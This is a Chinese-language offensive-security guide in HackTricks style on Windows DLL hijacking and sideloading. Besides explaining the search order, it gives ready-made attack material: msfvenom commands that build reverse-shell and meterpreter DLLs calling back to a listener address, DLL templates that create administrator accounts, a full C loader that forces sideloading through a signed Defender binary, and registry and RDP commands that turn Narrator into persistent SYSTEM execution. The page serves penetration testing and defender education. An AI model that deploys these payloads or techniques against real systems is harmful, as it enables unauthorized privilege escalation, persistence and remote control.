# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本信息

DLL Hijacking 涉及操纵受信任的应用加载恶意 DLL。该术语涵盖若干策略，例如 **DLL Spoofing, Injection, and Side-Loading**。它主要用于代码执行、实现持久性，以及在较少情况下用于权限提升。尽管此处关注于提升权限，劫持的方法在不同目标下是相同的。

### 常见技术

针对 DLL hijacking 有多种方法，根据应用的 DLL 加载策略，各方法的有效性不同：

1. **DLL Replacement**：用恶意 DLL 替换真实 DLL，可选地使用 DLL Proxying 来保留原始 DLL 的功能。
2. **DLL Search Order Hijacking**：将恶意 DLL 放在比合法 DLL 更优先的搜索路径中，利用应用的搜索模式。
3. **Phantom DLL Hijacking**：为应用创建一个恶意 DLL，使其误以为这是一个必需但不存在的 DLL 并加载它。
4. **DLL Redirection**：修改诸如 `%PATH%` 或 `.exe.manifest` / `.exe.local` 文件之类的搜索参数，将应用指向恶意 DLL。
5. **WinSxS DLL Replacement**：在 WinSxS 目录中将合法 DLL 替换为恶意对应文件，这种方法常与 DLL side-loading 相关。
6. **Relative Path DLL Hijacking**：将恶意 DLL 放在用户可控的目录中并与复制的应用一起放置，类似于 Binary Proxy Execution 技术。

## 查找缺失的 DLLs

在系统内查找缺失 DLLs 最常用的方法是运行 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)（来自 sysinternals），并**设置以下两个过滤器**：

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

然后只显示 **File System Activity**：

![](<../../../images/image (153).png>)

如果你只是想查找**一般缺失的 dlls**，可以让它运行几**秒钟**。\
如果你想查找某个**特定可执行文件内缺失的 dll**，应该再设置一个过滤器，例如 "Process Name" "contains" `<exec name>`，执行该可执行文件，然后停止捕获事件。

## 利用缺失的 DLLs

为了提升权限，我们最有机会的是能够**写入一个特权进程会尝试加载的 dll**到某个**会被搜索的位置**。因此，我们可以在一个**比原始 dll 所在文件夹更先被搜索的文件夹**中写入 dll（奇怪的情况），或者我们能够写入到某些搜索路径中的文件夹，而原始 **dll 在任何文件夹中都不存在**。

### DLL 搜索顺序

**在** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **中可以找到 DLL 是如何被加载的具体信息。**

Windows 应用按照一组预定义的搜索路径并遵循特定顺序查找 DLL。当恶意 DLL 被策略性地放置在这些目录中的某个位置，并且能在真实 DLL 之前被加载时，就会出现 DLL hijacking 的问题。防止此类问题的一个解决方案是确保应用在引用所需 DLL 时使用绝对路径。

下面显示了 32-bit 系统上的 **DLL search order**：

1. 应用程序加载时所在的目录。
2. 系统目录。使用 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 函数获取此目录的路径（_C:\Windows\System32_）。
3. 16-bit 系统目录。没有获取此目录路径的函数，但它会被搜索（_C:\Windows\System_）。
4. Windows 目录。使用 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 函数获取此目录的路径。
1. （_C:\Windows_）
5. 当前目录。
6. 列在 PATH 环境变量中的目录。注意，这不包括由 **App Paths** 注册表键指定的每个应用的路径。计算 DLL 搜索路径时不使用 **App Paths** 键。

这是启用 **SafeDllSearchMode** 时的**默认**搜索顺序。当其被禁用时，当前目录会上升到第二位。要禁用此功能，请创建 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode** 注册表值并将其设置为 0（默认启用）。

如果以 **LOAD_WITH_ALTERED_SEARCH_PATH** 调用 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 函数，则搜索从 **LoadLibraryEx** 正在加载的可执行模块的目录开始。

最后，请注意 **dll 也可能通过指定绝对路径而被加载**。在这种情况下，该 dll **仅会在该路径中被搜索**（如果该 dll 有任何依赖项，它们将按名称像刚加载的一样被搜索）。

还有其他改变搜索顺序的方法，这里不再展开说明。

### 通过 RTL_USER_PROCESS_PARAMETERS.DllPath 强制 sideloading

一种高级且确定性的方式是在使用 ntdll 的原生 API 创建进程时，在 RTL_USER_PROCESS_PARAMETERS 中设置 DllPath 字段来影响新创建进程的 DLL 搜索路径。通过在此处提供一个攻击者可控的目录，当目标进程按名称解析导入的 DLL（没有绝对路径且不使用安全加载标志）时，可以被迫从该目录加载恶意 DLL。

关键思路
- 使用 RtlCreateProcessParametersEx 构建进程参数，并提供一个指向你可控文件夹的自定义 DllPath（例如，放置你的 dropper/unpacker 的目录）。
- 使用 RtlCreateUserProcess 创建进程。当目标二进制按名称解析 DLL 时，加载器会在解析期间参考该提供的 DllPath，从而即使恶意 DLL 与目标 EXE 未放在一起，也能实现可靠的 sideloading。

注意/限制
- 这会影响被创建的子进程；它不同于只影响当前进程的 SetDllDirectory。
- 目标必须通过名称导入或通过 LoadLibrary 加载 DLL（没有绝对路径且不使用 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）。
- KnownDLLs 和硬编码的绝对路径无法被劫持。转发导出（Forwarded exports）和 SxS 可能改变优先级。

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

操作示例
- 将一个恶意的 xmllite.dll（导出所需函数或代理到真实的 DLL）放到你的 DllPath 目录中。
- 使用上述技术启动一个已签名且已知会按名称查找 xmllite.dll 的二进制文件。加载器通过提供的 DllPath 解析导入并 sideloading 你的 DLL。

该技术已在实战中被观察到用于驱动多阶段 sideloading 链：初始启动器放下一个辅助 DLL，随后该辅助 DLL 生成一个 Microsoft-signed、可被 hijack 的二进制，并使用自定义 DllPath 强制从暂存目录加载攻击者的 DLL。

#### Exceptions on dll search order from Windows docs

Windows 文档中指出对标准 DLL 搜索顺序的若干例外：

- 当遇到一个与内存中已加载的 DLL 同名的 **DLL that shares its name with one already loaded in memory** 时，系统会绕过常规搜索。系统会先检查重定向和 manifest，然后默认使用内存中已存在的 DLL。**在这种情况下，系统不会对该 DLL 进行搜索**。
- 如果该 DLL 被识别为当前 Windows 版本的 **known DLL**，系统将使用其已知 DLL 的版本及其任何依赖 DLL，**跳过搜索过程**。注册表键 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 保存了这些 known DLL 的列表。
- 如果一个 **DLL have dependencies**，对这些依赖 DLL 的搜索会像它们仅被指明为 **module names** 一样进行，无论最初的 DLL 是否通过完整路径被识别。

### 提权

**Requirements**：

- 识别一个以或将以 **different privileges**（horizontal or lateral movement）运行的进程，该进程 **lacking a DLL**。
- 确保对任何将被 **searched for** DLL 的 **directory** 拥有 **write access**。该位置可能是可执行文件的目录或 system path 中的某个目录。

是的，前提条件很难找到，因为 **by default it's kind of weird to find a privileged executable missing a dll**，更奇怪的是能在 system path 文件夹上拥有写权限（你默认情况下不能）。但在配置不当的环境中这是可能的。\
如果你足够幸运并且满足这些要求，可以查看 [UACME](https://github.com/hfiref0x/UACME) 项目。即便该项目的 **main goal of the project is bypass UAC**，你可能会在其中找到针对你所用 Windows 版本的 **PoC** 的 Dll hijaking（可能只需更改你有 write permissions 的文件夹路径即可）。

注意，你可以通过以下方式 **check your permissions in a folder**：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并 **检查 PATH 中所有文件夹的权限**：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
你也可以检查 executable 的 imports 和 dll 的 exports：
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
有关如何在具有写入 **System Path folder** 权限的情况下，完整地 **abuse Dll Hijacking to escalate privileges** 的指南，请查看：

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) 会检查你是否对 system PATH 中的任何文件夹具有写入权限。\
其他用于发现此类漏洞的有趣自动化工具包括 **PowerSploit functions**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_ 和 _Write-HijackDll_。

### Example

如果你发现了可利用的场景，成功利用它的关键之一是 **create a dll that exports at least all the functions the executable will import from it**。另外，注意 Dll Hijacking 可用于 [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) 或者从[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**。** 你可以在这个针对 dll hijacking（用于执行）的研究中找到一个 **how to create a valid dll** 的示例：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
此外，在 **next sectio**n 你可以找到一些可能作为 **templates** 有用的 **basic dll codes**，或用于创建一个导出非必需 functions 的 **dll**。

## **Creating and compiling Dlls**

### **Dll Proxifying**

基本上，**Dll proxy** 是一个在被加载时能够 **execute your malicious code when loaded** 的 Dll，同时通过将所有调用转发到真实库来 **expose** 并 **work** 如预期那样。

使用工具 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 或 [**Spartacus**](https://github.com/Accenture/Spartacus)，你实际上可以指定一个可执行文件并选择要 proxify 的 library，进而 **generate a proxified dll**；也可以指定一个 Dll 并 **generate a proxified dll**。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取一个 meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建一个用户（x86，我没看到 x64 版本）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 你自己的

请注意，在若干情况下，你编译的 DLL 必须 **export several functions**，这些函数将由 victim process 加载；如果这些函数不存在，**binary won't be able to load** 它们，**exploit will fail**。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 示例（创建用户）</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>替代的带线程入口的 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 案例研究： Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe 仍会在启动时探测一个可预测、基于语言的 localization DLL，该 DLL 可被 DLL Hijack 利用以实现 arbitrary code execution 和 persistence。

要点
- 探测路径（当前构建）：`%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- 旧路径（早期构建）：`%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- 如果在 OneCore 路径存在一个可写且由攻击者控制的 DLL，则会被加载并执行 `DllMain(DLL_PROCESS_ATTACH)`。不需要导出函数。

使用 Procmon 发现
- 筛选: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- 启动 Narrator 并观察对上述路径的加载尝试。

最小 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC 静默
- 粗糙的 hijack 会触发发声/高亮 UI。为保持静默，在 attach 时枚举 Narrator 的线程，打开主线程 (`OpenThread(THREAD_SUSPEND_RESUME)`) 并对其调用 `SuspendThread`；在你自己的线程中继续。完整代码见 PoC。

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 按上述设置，启动 Narrator 会加载被植入的 DLL。在安全桌面（logon screen）上，按 CTRL+WIN+ENTER 启动 Narrator。

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP 到主机，在 logon screen 按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会以 SYSTEM 身份在安全桌面上执行。
- 当 RDP 会话关闭时执行会停止——请及时注入/迁移。

Bring Your Own Accessibility (BYOA)
- 你可以克隆一个内置的 Accessibility Tool (AT) 注册表项（例如 CursorIndicator），编辑它以指向任意二进制/DLL，导入后将 `configuration` 设置为该 AT 名称。这会在 Accessibility framework 下代理任意执行。

Notes
- 在 `%windir%\System32` 下写入和修改 HKLM 值需要管理员权限。
- 所有 payload 逻辑可以放在 `DLL_PROCESS_ATTACH`；不需要导出。

## 案例研究： CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

本例展示了 Lenovo 的 TrackPoint Quick Menu (`TPQMAssistant.exe`) 中的 **Phantom DLL Hijacking**，被跟踪为 **CVE-2025-1729**。

### 漏洞详情

- **组件**: `TPQMAssistant.exe`，位于 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` 每天 9:30 AM 以已登录用户的上下文运行。
- **目录权限**: 对 `CREATOR OWNER` 可写，允许本地用户投放任意文件。
- **DLL 搜索行为**: 先尝试从其工作目录加载 `hostfxr.dll`，如果缺失会记录 "NAME NOT FOUND"，表明本地目录搜索优先。

### 利用实现

攻击者可以在相同目录放置恶意的 `hostfxr.dll` 存根，利用缺失的 DLL 在用户上下文下实现代码执行：
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻击流程

1. 作为标准用户，将 `hostfxr.dll` 放到 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
2. 等待计划任务在当前用户上下文于 9:30 AM 运行。
3. 如果任务执行时有管理员登录，恶意 DLL 会在管理员会话中以 medium integrity 运行。
4. 链接常见的 UAC 绕过技术，将权限从 medium integrity 提升到 SYSTEM。

## 案例研究: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

威胁行为者经常将 MSI-based droppers 与 DLL side-loading 配合使用，以在受信任的签名进程下执行 payloads。

Chain overview
- 用户下载 MSI。在 GUI 安装过程中，一个 CustomAction 会静默运行（例如 LaunchApplication 或 VBScript action），从嵌入的资源重建下一阶段。
- dropper 将一个合法签名的 EXE 和一个恶意 DLL 写入同一目录（示例配对：Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 当签名的 EXE 启动时，Windows DLL 查找顺序会优先从工作目录加载 wsc.dll，从而在签名父进程下执行攻击者代码（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction table:
- 查找运行可执行文件或 VBScript 的条目。可疑示例模式：LaunchApplication 在后台执行嵌入文件。
- 在 Orca (Microsoft Orca.exe) 中，检查 CustomAction、InstallExecuteSequence 和 Binary 表。
- MSI CAB 中的嵌入/分割 payloads:
- 管理员提取：msiexec /a package.msi /qb TARGETDIR=C:\out
- 或使用 lessmsi: lessmsi x package.msi C:\out
- 查找多个小碎片，这些碎片会被 VBScript CustomAction 连接并解密。常见流程：
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
使用 wsc_proxy.exe 的实用 sideloading
- 将以下两个文件放在同一文件夹：
- wsc_proxy.exe: 合法已签名的宿主 (Avast)。该进程会尝试从其目录按名称加载 wsc.dll。
- wsc.dll: 攻击者 DLL。如果不需要特定的导出，DllMain 就足够；否则，构建一个 proxy DLL 并在 DllMain 中运行 payload 的同时，将所需的导出转发到真实库。
- 构建最小化的 DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- 对于导出要求，使用代理框架（例如 DLLirant/Spartacus）生成一个转发 DLL，同时执行你的 payload。

- 该技术依赖于宿主二进制对 DLL 名称的解析。如果宿主使用绝对路径或安全加载标志（例如 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories），hijack 可能会失败。
- KnownDLLs、SxS 和 forwarded exports 会影响优先级，必须在选择宿主二进制和导出集合时予以考虑。

## 参考资料

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
